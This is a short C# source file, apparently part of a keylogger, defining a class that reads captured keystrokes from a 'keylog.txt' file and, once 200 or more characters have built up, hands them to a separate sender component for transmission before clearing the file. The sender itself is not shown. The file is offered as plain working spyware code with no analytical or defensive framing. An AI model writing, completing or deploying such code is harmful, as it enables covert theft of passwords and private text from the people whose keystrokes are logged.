namespace Logger
{
    public class Text
    {
        public string tex;
        Sender sender = new Sender();

        public Text()
        {
            tex = ReadLogFile();
        }

        public void sendee()
        {
            if (tex.Length >= 200)
            {
                sender.Send(tex);

                tex = "";

                WriteLogFile(tex);
            }
        }

        private string ReadLogFile()
        {
            string logFilePath = Path.Combine(Directory.GetCurrentDirectory(), "keylog.txt");

            if (File.Exists(logFilePath))
            {
                using (StreamReader sr = new StreamReader(logFilePath))
                {
                    return sr.ReadToEnd();
                }
            }

            return string.Empty;
        }

        private void WriteLogFile(string content)
        {
            string logFilePath = Path.Combine(Directory.GetCurrentDirectory(), "keylog.txt");

            using (StreamWriter outputFile = new StreamWriter(logFilePath))
            {
                outputFile.Write(content);
            }
        }
    }
}